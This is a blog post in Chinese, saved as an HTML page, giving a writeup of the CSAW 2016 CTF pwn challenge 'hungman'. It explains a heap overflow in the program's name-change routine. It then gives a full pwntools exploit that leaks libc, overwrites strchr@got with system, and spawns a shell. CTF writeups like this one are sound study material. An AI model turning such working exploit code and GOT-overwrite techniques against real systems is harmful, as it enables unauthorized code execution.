<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> CSAW 2016 hungman writeup · Arvin.X's Blog</title><meta name="description" content="CSAW 2016 hungman writeup - Arvin.X"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://a7vinx.github.io/atom.xml" title="Arvin.X's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/a7vinx" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">CSAW 2016 hungman writeup</h1><div class="post-info">Sep 19, 2016</div><div class="post-content"><p>300分的pwn</p>
<p>程序是一个简单的游戏，在你输入名字后，将名字存入malloc出的chunk中，然后会生成一个结构体，大概长这样：</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00000000 struc_obj       struc ; (sizeof=0x80)</div><div class="line">00000000 score           dd ?</div><div class="line">00000004 name_len        dd ?</div><div class="line">00000008 namep           dq ?</div><div class="line">00000010 content         db 112 dup(?)</div><div class="line">00000080 struc_obj       ends</div><div class="line">00000080</div></pre></td></tr></table></figure>
<p>然后开始游戏主循环，在主循环中生成一个和名字大小相同的buf，然后将其与随机数一阵操作生成新的随机buf：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for ( i = 0LL; name_len - 1 &gt; i; ++i )</div><div class="line">&#123;</div><div class="line">  *((_BYTE *)buf + i) ^= *(_BYTE *)(objp-&gt;namep + i);</div><div class="line">  *((_BYTE *)buf + i) = *((_BYTE *)buf + i) % 26u + 97;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以操作结束后buf中将只有小写字母的ascii码，然后打印一排”<em>“代表buf，接着就是接收输入字符，如果buf中有这个字符，就在下次对应位置打印这个字符而不是”</em>“，有三次机会可以猜错，机会用完后或者全部猜出来后会获得一次修改名字的机会，这里就是漏洞所在，如果输入的名字比原来的长就可能发生溢出，因为操作长这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if ( objp-&gt;score &gt; score_history )</div><div class="line">    &#123;</div><div class="line">      puts(&quot;High score! change name?&quot;);</div><div class="line">      __isoc99_scanf(0x40114FLL, &amp;v3);          // %c</div><div class="line">      if ( v3 == 121 )</div><div class="line">      &#123;</div><div class="line">        namep = malloc(0xF8uLL);</div><div class="line">        memset(namep, 0, 0xF8uLL);</div><div class="line">        new_name_len = read(0, namep, 0xF8uLL);</div><div class="line">        objp-&gt;name_len = new_name_len;</div><div class="line">        v14 = strchr((const char *)namep, 10);</div><div class="line">        if ( v14 )</div><div class="line">          *v14 = 0;</div><div class="line">        memcpy((void *)objp-&gt;namep, namep, new_name_len);// ---- overflow  </div><div class="line">        free(namep);</div><div class="line">      &#125;</div><div class="line">      snprintf(byte_602100, 0x200uLL, &quot;Highest player: %s&quot;, objp-&gt;namep);</div><div class="line">      score_history = objp-&gt;score;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>所以如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会，就可以更改较长的名字首先泄漏strchr地址，然后再赢得一次游戏将strchr@got替换位system，然后再赢得一次将name换为/bin/sh触发system就可以了。</p>
<p>但是这里有几个坑，在这里记录一下：<br>一是一开始选择泄漏函数的时候选了free，但是发现free地址低位是\x00正好截断，所以就换了strchr（不过偏移一位再泄漏free也可以）。<br>二是选择了strchr后，但是对应的strchr@got上填的地址是strchr_see2，应该是某种优化，所以这里又耽搁了一下。<br>三是在最后发送system地址过去的时候不能使用sendline，只能使用send，因为sendline导致9个字符被memcpy过去，导致strchr@got下面的printf@got被破坏，崩溃了没得玩了。<br>四是不知为何在第一次发送name的时候前面必须加个time.sleep(0.1)，或者在play()中加个print recv，否则就可能成功可能失败，这里到现在我也不知道是因为什么，调试的话一点问题也没有，所以到现在还是憋着找不出原因。</p>
<p>参考exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">letters=<span class="string">'abcdefghijklmnopqrstuvwxyzz'</span></div><div class="line">name=<span class="string">'A'</span>*<span class="number">32</span></div><div class="line">p=process(<span class="string">'./hungman'</span>)</div><div class="line">free_got=<span class="number">0x602018</span></div><div class="line">strchr_got=<span class="number">0x602038</span></div><div class="line"><span class="comment">#context.log_level='debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpid</span><span class="params">(name)</span>:</span></div><div class="line">	pid= pwnlib.util.proc.pidof(name)</div><div class="line">	log.info(pid)</div><div class="line">	raw_input(<span class="string">'continue'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">'-- play --'</span></div><div class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> letters:</div><div class="line">		recv=p.recvline()</div><div class="line">		<span class="keyword">print</span> recv</div><div class="line">		<span class="keyword">if</span> recv.startswith(<span class="string">'High score! change name?'</span>):</div><div class="line">			<span class="comment"># I do not know why it need to print recv here,</span></div><div class="line">			<span class="comment"># or it will failed to recieve in line 42</span></div><div class="line">			<span class="comment"># time.sleep(0.1) can works here too. why ???</span></div><div class="line">			<span class="keyword">print</span> recv</div><div class="line">			<span class="keyword">print</span> <span class="string">'[*] win!'</span></div><div class="line">			p.sendline(<span class="string">'y'</span>)</div><div class="line">			<span class="keyword">return</span></div><div class="line">		<span class="keyword">if</span> recv.startswith(<span class="string">'Default Highscore  score: 64'</span>):</div><div class="line">			<span class="keyword">print</span> <span class="string">'[-] try again...'</span></div><div class="line">			p.recvuntil(<span class="string">'Continue? '</span>)</div><div class="line">			p.sendline(<span class="string">'y'</span>)</div><div class="line">			<span class="keyword">return</span> play()</div><div class="line">		p.sendline(c)	</div><div class="line"></div><div class="line">p.recvline()</div><div class="line">p.sendline(<span class="string">'A'</span>*<span class="number">30</span>)</div><div class="line">p.recvline()</div><div class="line">play()</div><div class="line">p.sendline(name+p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)+p32(<span class="number">0x52</span>)+p32(<span class="number">0xc9</span>)+p64(strchr_got))</div><div class="line"><span class="comment">#context.update(terminal=['tmux','splitw','-h'])</span></div><div class="line"><span class="comment">#gdb.attach(p,'b *0x0000000000400E77')</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Highest player: '</span>)</div><div class="line">strchr_addr=p.recvuntil(<span class="string">' score:'</span>)[:<span class="number">-7</span>]</div><div class="line">strchr_addr=u64(strchr_addr.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</div><div class="line"></div><div class="line"><span class="comment"># actually it is address of strchr_see2, not strchr</span></div><div class="line"><span class="keyword">print</span> <span class="string">'strchr addr: '</span>+hex(strchr_addr)</div><div class="line">system_addr=strchr_addr<span class="number">-0x30</span><span class="number">-0x000000000007ff70</span>+<span class="number">0x0000000000041490</span></div><div class="line"><span class="keyword">print</span> <span class="string">'system addr: '</span>+hex(system_addr)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Continue? '</span>)</div><div class="line">p.sendline(<span class="string">'y'</span>)</div><div class="line">play()</div><div class="line"><span class="comment"># getpid('hungman')</span></div><div class="line"><span class="comment"># can not use sendline() here cause it will crash printf@got.plt</span></div><div class="line">p.send(p64(system_addr))</div><div class="line">p.recvuntil(<span class="string">'Continue? '</span>)</div><div class="line">p.sendline(<span class="string">'y'</span>)</div><div class="line">play()</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
</div></article></div></section><footer><div class="paginator"><a href="/2016/10/25/android_debug_analysis/" class="prev">PREV</a><a href="/2016/09/19/csaw_2016_tutorial_writeup/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://a7vinx.github.io">Arvin.X</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>